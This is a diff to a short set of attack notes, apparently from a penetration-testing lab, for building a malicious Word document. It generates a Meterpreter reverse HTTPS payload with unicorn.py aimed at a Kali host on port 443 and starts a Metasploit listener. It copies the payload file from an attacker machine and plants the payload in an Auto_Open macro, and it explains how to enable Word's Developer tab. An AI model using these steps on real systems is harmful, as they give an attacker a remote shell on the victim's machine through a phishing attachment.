@@ -15,15 +15,20 @@ chmod +x unicorn
 python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
 ---------
 
-sudo apt install xsel
-cat powershell_attack.txt | xsel --clipboard
-
+sudo mv powershell_attack.txt /home/powershell_attack.txt
+scp kali@10.3.99.1:/home/powershell.txt .
+---------
 
 sudo msfconsole -r unicorn.rc
 
 ---------
 Copy maro powershell_attack.txt into Word attachment. 
 Open Word / Developer / Macros / Create / Auto_Open / insert payload .
+
+The Developer tab in Word is hidden by default and needs to be enabled in the Word options. 
+To show it, navigate to File > Options > Customize Ribbon, then check the box next to Developer under Main Tabs. 
+Click OK to save the changes and the Developer tab will appear on the ribbon
+
 https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
 ---------
 "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"
